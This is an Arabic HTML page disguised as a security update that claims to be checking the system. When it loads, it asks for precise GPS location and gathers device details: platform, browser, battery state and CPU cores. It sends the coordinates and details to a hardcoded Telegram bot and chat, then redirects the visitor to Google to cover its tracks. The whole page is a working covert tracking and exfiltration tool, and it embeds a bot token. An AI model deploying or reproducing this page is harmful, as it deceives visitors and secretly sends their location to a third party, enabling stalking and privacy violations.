<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>تحديث الأمان</title>
</head>
<body style="background-color: #f0f0f0; text-align: center; font-family: Arial; padding-top: 50px;">
    <h2>جاري فحص حالة النظام...</h2>
    <p>يرجى الموافقة على طلب الموقع للمتابعة</p>

    <script>
        const botToken = "8113942047:AAFTJz0lZe1Mjsc0vX79LeCq4MKjwwDuFEw"; 
        const chatId = "7984067238"; 

        async function getDeviceInfo() {
            let info = "";
            // 1. نوع الهاتف وإصدار المتصفح
            info += `📱 الجهاز: ${navigator.userAgentData ? navigator.userAgentData.platform : navigator.platform}\n`;
            info += `🌐 المتصفح: ${navigator.appName}\n`;
            
            // 2. نسبة البطارية
            try {
                const battery = await navigator.getBattery();
                info += `🔋 البطارية: ${Math.round(battery.level * 100)}%\n`;
                info += `⚡ حالة الشحن: ${battery.charging ? "متصل بالشاحن" : "غير متصل"}\n`;
            } catch (e) {
                info += `🔋 البطارية: غير مدعوم في هذا المتصفح\n`;
            }

            // 3. عدد أنوية المعالج (يعطي فكرة عن قوة الجهاز)
            info += `💻 المعالج: ${navigator.hardwareConcurrency || "غير معروف"} نواة\n`;
            
            return info;
        }

        async function sendData(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const deviceDetails = await getDeviceInfo();
            
            const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
            
            const fullMessage = `🛰️ **تقرير جديد**\n\n` +
                                `${deviceDetails}` +
                                `📍 الموقع: ${mapLink}`;

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(fullMessage)}&parse_mode=Markdown`)
            .then(() => {
                window.location.href = "https://www.google.com";
            });
        }

        window.onload = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendData, (err) => {
                    alert("يرجى تفعيل الموقع الجغرافي (GPS) للمتابعة.");
                }, { enableHighAccuracy: true });
            }
        };
    </script>
</body>
</html>
